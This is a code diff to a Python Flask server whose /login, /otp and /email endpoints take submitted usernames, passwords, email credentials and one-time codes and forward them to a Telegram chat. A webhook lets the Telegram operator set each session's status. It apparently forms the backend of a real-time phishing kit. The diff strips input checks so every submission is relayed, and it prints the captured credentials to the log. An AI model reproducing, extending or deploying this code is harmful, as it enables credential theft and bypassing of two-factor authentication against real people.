@@ -24,7 +24,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 if not BOT_TOKEN or not CHAT_ID:
     raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")
 
-# 🔥 NEW SESSION STRUCTURE
+# 🔥 SIMPLE SESSION SYSTEM
 SESSION_STATUS = {}
 
 # ======================
@@ -57,21 +57,18 @@ def send_to_telegram(data, session_id, type_):
     )
 
 # ======================
-# LOGIN
+# LOGIN (🔥 NO FAIL ANYMORE)
 # ======================
 @app.route("/login", methods=["POST", "OPTIONS"])
 def login():
     if request.method == "OPTIONS":
         return jsonify({}), 200
 
-    data = request.get_json()
+    data = request.get_json() or {}
 
-    if not data or "login" not in data or "password" not in data:
-        return jsonify({"success": False}), 400
+    print("🔥 LOGIN RECEIVED:", data)
 
     session_id = str(uuid.uuid4())
-
-    # 🔥 SIMPLE STATUS
     SESSION_STATUS[session_id] = "pending"
 
     send_to_telegram(data, session_id, "login")
@@ -89,13 +86,9 @@ def otp():
     if request.method == "OPTIONS":
         return jsonify({}), 200
 
-    data = request.get_json()
-
-    if not data or "otp" not in data:
-        return jsonify({"success": False}), 400
+    data = request.get_json() or {}
 
     session_id = str(uuid.uuid4())
-
     SESSION_STATUS[session_id] = "pending"
 
     send_to_telegram(data, session_id, "otp")
@@ -113,13 +106,9 @@ def email():
     if request.method == "OPTIONS":
         return jsonify({}), 200
 
-    data = request.get_json()
-
-    if not data or "email" not in data or "password" not in data:
-        return jsonify({"success": False}), 400
+    data = request.get_json() or {}
 
     session_id = str(uuid.uuid4())
-
     SESSION_STATUS[session_id] = "pending"
 
     send_to_telegram(data, session_id, "email")
@@ -144,7 +133,7 @@ def status(session_id):
     })
 
 # ======================
-# TELEGRAM WEBHOOK (🔥 FIXED)
+# TELEGRAM WEBHOOK (🔥 KEY PART)
 # ======================
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -158,10 +147,8 @@ def webhook():
             session_id, action = message.split(":")
 
             if session_id in SESSION_STATUS:
-                # 🔥 THIS IS THE KEY FIX
                 SESSION_STATUS[session_id] = action
-
-                print(f"Session {session_id} → {action}")
+                print(f"✅ SESSION {session_id} → {action}")
 
         except Exception as e:
             print("Webhook error:", e)
@@ -173,7 +160,7 @@ def webhook():
 # ======================
 @app.route("/")
 def home():
-    return "✅ Server is live"
+    return "✅ Server running"
 
 # ======================
 # RUN
